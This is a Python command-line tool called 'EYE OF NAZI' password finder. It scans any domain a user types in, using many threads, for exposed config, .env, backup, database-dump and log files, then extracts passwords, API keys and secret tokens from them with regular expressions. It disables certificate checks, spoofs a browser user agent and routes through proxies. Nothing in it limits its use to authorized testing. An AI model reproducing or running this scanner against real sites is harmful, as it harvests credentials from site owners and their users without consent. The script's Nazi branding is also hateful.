#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EYE OF NAZI v50.0 - PASSWORD FINDER
# Made by Cyber Kurd Team

import sys, os, re, ssl, time, json
import urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGO = r"""
\033[91m\033[1m
   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
\033[0m\033[93m\033[1m                    EYE OF NAZI
\033[96m=============================================================\033[0m
\033[97m\033[1m              PASSWORD FINDER v50.0\033[0m
\033[2m              Made by Cyber Kurd Team\033[0m
\033[96m=============================================================\033[0m
"""

# Password files to scan
PASSWORD_FILES = [
    '.env', '.env.local', '.env.production', '.env.backup', '.env.dev',
    '.env.test', '.env.staging', '.env.old', '.env.save', '.env.bak',
    'wp-config.php', 'wp-config.php.bak', 'wp-config.php~',
    'wp-config.php.old', 'wp-config.php.save', 'wp-config.php.orig',
    'config.php', 'config.php.bak', 'config.php~',
    'configuration.php', 'configuration.php.bak',
    'config.inc.php', 'config.json', 'config.yml', 'config.yaml',
    'config.xml', 'config.old', 'config.backup', 'config.save',
    'settings.py', 'settings.php', 'settings.json',
    'database.yml', 'database.php', 'database.sql',
    'db.php', 'db.php.bak', 'db.sql', 'db_backup.sql',
    'database.sql.gz', 'db.sql.gz', 'dump.sql',
    '.htaccess', '.htpasswd', 'web.config', 'nginx.conf',
    'config.txt', 'config.cfg', 'config.ini',
    'credentials.json', 'secrets.json', 'passwords.txt',
    'passwd', 'shadow', 'passwords',
    'admin.php', 'admin/config.php', 'admin/config.json',
    'includes/config.php', 'includes/db.php',
    'application/config.php', 'application/database.php',
    'app/config.php', 'app/config.json',
]

# Patterns to find passwords
PASSWORD_PATTERNS = [
    r'password["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'passwd["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'pwd["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'pass["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'secret["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'apikey["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'token["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'access[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'secret[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'private[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'auth[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'db[_-]?pass(word)?["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'mysql[_-]?pass(word)?["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'pgsql[_-]?pass(word)?["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'db_password\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_PASS\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'MYSQL_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'DATABASE_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'SMTP_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'MAIL_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'ADMIN_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'JWT_SECRET\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'APP_KEY\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'APP_SECRET\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'AWS_SECRET[_-]?ACCESS[_-]?KEY\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'SECRET_KEY\s*=\s*["\']([^"\'\s]{4,80})["\']',
    r'API_SECRET\s*=\s*["\']([^"\'\s]{4,80})["\']',
]

# Common CMS config paths
WP_CONFIG_PATHS = [
    'wp-config.php', 'wp-config.php.bak', 'wp-config.php~',
    'wp-config.php.old', 'wp-config.php.save', 'wp-config.php.orig',
    'wp-config.php.txt', 'wp-config.txt',
    'wp-content/wp-config.php', 'wp-admin/wp-config.php',
    'wp-config-sample.php',
]

ENV_PATHS = [
    '.env', '.env.local', '.env.production', '.env.backup',
    '.env.dev', '.env.test', '.env.staging', '.env.old',
    '.env.save', '.env.bak', '.env.example', '.env.sample',
    'env', 'env.txt', '.env.txt',
]


class Client:
    def __init__(self, timeout=10, cookie=None, proxy=None):
        self.timeout = timeout
        self.cookie = cookie
        self.proxy = proxy
        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"

    def req(self, url):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if self.proxy:
            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
        else:
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
        if self.cookie:
            hdrs['Cookie'] = self.cookie
        r = urllib.request.Request(url, headers=hdrs)
        try:
            rp = op.open(r, timeout=self.timeout)
            body = rp.read()
            return {'s': rp.getcode(), 't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'err': None}
        except urllib.error.HTTPError as e:
            try:
                body = e.read()
            except Exception:
                body = b''
            return {'s': e.code, 't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'err': None}
        except Exception as e:
            return {'s': 0, 't': '', 'n': 0, 'err': str(e)}


class PasswordFinder:
    def __init__(self, url, cl, threads=20):
        self.url = url.rstrip('/')
        self.cl = cl
        self.threads = threads
        self.found = []
        self.scanned = 0
        self.checked = 0

    def add(self, url, password, source):
        self.found.append({'url': url, 'password': password, 'source': source})
        print("\n  \033[41m\033[97m[PASSWORD]\033[0m \033[1mCRITICAL\033[0m")
        print("    URL     : " + url[:120])
        print("    Source  : " + source)
        print("    Password: \033[93m" + password[:80] + "\033[0m")

    def extract_passwords(self, text):
        results = []
        for pat in PASSWORD_PATTERNS:
            try:
                matches = re.findall(pat, text, re.IGNORECASE)
                for m in matches:
                    if isinstance(m, tuple):
                        for x in m:
                            if x and 4 <= len(x) <= 80:
                                results.append(x)
                    elif m and 4 <= len(m) <= 80:
                        results.append(m)
            except Exception:
                pass
        return list(set(results))

    def check_file(self, base, path):
        url = base.rstrip('/') + '/' + path.lstrip('/')
        r = self.cl.req(url)
        self.checked += 1
        if r['err'] or r['s'] != 200:
            return None
        # Look for password patterns
        passwords = self.extract_passwords(r['t'])
        if passwords:
            for pwd in passwords[:5]:
                self.add(url, pwd, path)
            return {'url': url, 'count': len(passwords)}
        # Also check if it's a config file with sensitive keywords
        keywords = ['password', 'passwd', 'secret', 'api_key',
                    'apikey', 'db_pass', 'db_password', 'private_key',
                    'access_key', 'auth_key', 'smtp_pass', 'jwt_secret']
        text_low = r['t'].lower()
        for kw in keywords:
            if kw in text_low:
                self.add(url, '(keyword found: ' + kw + ')', path)
                return {'url': url, 'count': 1}
        return None

    def scan(self):
        print("\n\033[96m" + "=" * 60 + "\033[0m")
        print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
        print("\033[96m" + "=" * 60 + "\033[0m")

        # Step 1 - Config files
        print("\n\033[96m[1/4]\033[0m Config Files (" + str(len(PASSWORD_FILES)) + ")...")
        all_paths = list(set(PASSWORD_FILES + WP_CONFIG_PATHS + ENV_PATHS))
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = []
            for p in all_paths:
                futures.append(ex.submit(self.check_file, self.url, p))
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if res:
                        self.scanned += 1
                except Exception:
                    pass

        # Step 2 - Common admin paths
        print("\n\033[96m[2/4]\033[0m Admin Paths...")
        admin_paths = [
            'admin.php', 'admin/config.php', 'admin/config.json',
            'admin/settings.php', 'admin/db.php',
            'includes/config.php', 'includes/db.php',
            'includes/settings.php', 'includes/connection.php',
            'application/config.php', 'application/database.php',
            'app/config.php', 'app/config.json', 'app/settings.php',
            'core/config.php', 'system/config.php',
            'wp-admin/setup-config.php', 'wp-admin/install.php',
        ]
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = []
            for p in admin_paths:
                futures.append(ex.submit(self.check_file, self.url, p))
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception:
                    pass

        # Step 3 - Backup files
        print("\n\033[96m[3/4]\033[0m Backup Files...")
        backup_paths = [
            'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.rar',
            'backup.bak', 'backup.old', 'backup-2024.zip',
            'backup-2023.zip', 'old.zip', 'site_backup.zip',
            'full_backup.zip', 'db_backup.sql', 'database.sql',
            'dump.sql', 'db.sql', 'db.sql.gz',
            'www.zip', 'site.zip', 'web.zip',
        ]
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = []
            for p in backup_paths:
                futures.append(ex.submit(self.check_file, self.url, p))
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception:
                    pass

        # Step 4 - Log files
        print("\n\033[96m[4/4]\033[0m Log Files...")
        log_paths = [
            'error.log', 'access.log', 'debug.log', 'error_log',
            'php_error.log', 'php_errorlog', 'logs/error.log',
            'logs/access.log', 'var/log/apache2/error.log',
            'wp-content/debug.log', '.log', 'log.txt',
        ]
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = []
            for p in log_paths:
                futures.append(ex.submit(self.check_file, self.url, p))
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception:
                    pass

        # Final report
        print("\n\033[96m" + "=" * 60 + "\033[0m")
        print("  Files Checked: " + str(self.checked))
        print("  Files Found: \033[1m\033[91m" + str(self.scanned) + "\033[0m")
        print("  Passwords Found: \033[1m\033[91m" + str(len(self.found)) + "\033[0m")
        print("\033[96m" + "=" * 60 + "\033[0m\n")

        if not self.found:
            print("  \033[92mNo passwords found.\033[0m\n")

    def save_json(self, filename):
        with open(filename, 'w', encoding='utf-8') as fp:
            json.dump({'target': self.url, 'passwords': self.found},
                      fp, indent=2, ensure_ascii=False)
        print("\033[92m[+]\033[0m Saved: " + filename)


def is_url(text):
    if text.startswith(('http://', 'https://')):
        return True
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text):
        return True
    return False


def main():
    print(LOGO)
    print("\n\033[96m" + "=" * 60 + "\033[0m")
    print("\033[92m  Password Finder - Type a domain to scan.\033[0m")
    print("\033[96m" + "=" * 60 + "\033[0m\n")

    st = {'cookie': None, 'proxy': None, 'threads': 20, 'last': None}

    while True:
        try:
            line = input("\033[1m\033[92mnazi\033[0m\033[93m@\033[0m"
                         "\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\033[93m[!] Bye\033[0m")
            break

        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd in ('exit', 'quit', 'q'):
            print("\033[93mBye.\033[0m")
            break
        elif cmd == 'cookie':
            if arg:
                st['cookie'] = arg
                print("\033[92m[+] Cookie set\033[0m")
        elif cmd == 'proxy':
            if arg:
                st['proxy'] = arg
                print("\033[92m[+] Proxy set\033[0m")
        elif cmd == 'threads':
            if arg:
                try:
                    st['threads'] = int(arg)
                    print("\033[92m[+] Threads: " + arg + "\033[0m")
                except Exception:
                    pass
        elif cmd == 'status':
            print("\n  Cookie: " + str(st['cookie']))
            print("  Proxy: " + str(st['proxy']))
            print("  Threads: " + str(st['threads']) + "\n")
        elif cmd == 'clear':
            os.system('clear')
            print(LOGO)
        elif cmd == 'save':
            if st['last'] and arg:
                st['last'].save_json(arg)
        elif is_url(cmd):
            url = cmd if cmd.startswith(('http://', 'https://')) else 'http://' + cmd
            print("\n\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
            conf = input("\033[93m    Start? (y/n): \033[0m").strip().lower()
            if conf not in ('y', 'yes', ''):
                continue
            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
            sc = PasswordFinder(url, cl, threads=st['threads'])
            try:
                sc.scan()
                st['last'] = sc
            except KeyboardInterrupt:
                print("\n\033[93m[!] Stopped\033[0m")
                st['last'] = sc
            except Exception as e:
                print("\n\033[91m[!] Error: " + str(e) + "\033[0m")
        else:
            print("\033[91m[!] Unknown: " + cmd + "\033[0m")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[93m[!] Bye\033[0m")
